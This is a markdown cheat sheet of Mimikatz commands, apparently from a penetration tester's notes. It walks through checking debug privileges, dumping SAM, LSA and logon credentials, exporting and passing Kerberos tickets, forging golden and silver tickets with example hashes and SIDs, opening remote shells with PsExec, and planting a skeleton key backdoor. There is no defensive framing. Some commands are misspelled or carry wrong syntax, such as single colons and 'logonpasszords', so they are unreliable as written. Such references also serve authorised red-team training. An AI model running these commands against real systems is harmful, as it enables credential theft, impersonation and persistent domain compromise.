---
title: MIMIKATZ
summary: "A tool to play with Windows security, written in C."
description: "A tool to play with Windows security, written in C."
---

**[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)**

## Check Admin Privileges


 > 
 > **<font color=red>privilege::debug</font>**</br>
 > Ensure that current user has administrator privileges (the output should be `[output '20' OK]`). This indicates that debugging a process is possible.

## Initial Access


 > 
 > **<font color=red>misc::cmd</font>**</br>
 > Open a new elevated command prompt with the given ticket in Minikatz.

 > 
 > **<font color=red>dir \\\\TARGET-MACHINE-NAME\\c$</font>**</br>
 > List files in c drive of the machine.

 > 
 > **<font color=red>PsExec.exe </font>\\\\TARGET-MACHINE-NAME<font color=red>cmd.exe</font>**</br>
 > Get a shell on the machine.

## Password Dump


 > 
 > **<font color=red>creds_all</font>**</br>
 > Dump passwords.

 > 
 > **<font color=red>lsadump:sam</font>**</br>
 > Dump SAM base.

 > 
 > **<font color=red>sekurlsa:logonpasszords</font>**</br>
 > Dump logon passwords.

## Pass the Ticket


 > 
 > **<font color=red>sekurlsa::tickets /export</font>**</br>
 > Export all `.kirbi` tickets into the current directory.


 > 
 > **<font color=red>kerberos::ptt</font> myTicketFromSekurlsa<font color=red>.kirbi</font>**</br>
 > Cache and impersonate the given ticket.

## Golden/Silver Ticket


 > 
 > **<font color=red>lsadump::lsa /inject /name:</font>krbtgt**</br>
 > Dump hash and security identifier required to create a Golden Ticket. 

Note: To create a Silver Ticket, change the `/name:` to a domain admin account or a service account.

![exploit-lsadump-golden_ticket.png](../../attachments/exploit-lsadump-golden_ticket.png)
Credit: TCM Security

 > 
 > **<font color=red>kerberos::golden /user:</font>Administrator <font color=red>/domain:</font>mycontroller.local <font color=red>/sid:</font>S-1-5-21-432953485-3795405108-1502158860  <font color=red>/krbtgt:</font>72cd714611b64cd4d5550cd2759db3f6 <font color=red>/id:500 /ptt</font>**</br>
 > Create a golden ticket (`/ptt` stands for Pass The Ticket, if we don’t put it, the command will save the ticket to a file).

Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtgt:` slot, the sid of the service account into `/sid:`, and change the `/id:` to 1103.

## Skeleton Key


 > 
 > **<font color=red>misc::skeleton</font>**</br>
 > Create a backdoor with credentials "mimikatz". 

 > 
 > **<font color=red>dir \\\\</font>Desktop-1<font color=red>\\c$</font> <font color=red>/user:</font>Machine1 <font color=red>mimikatz</font>**</br>
 > List C: drive content using Skleton Key backdoor. 
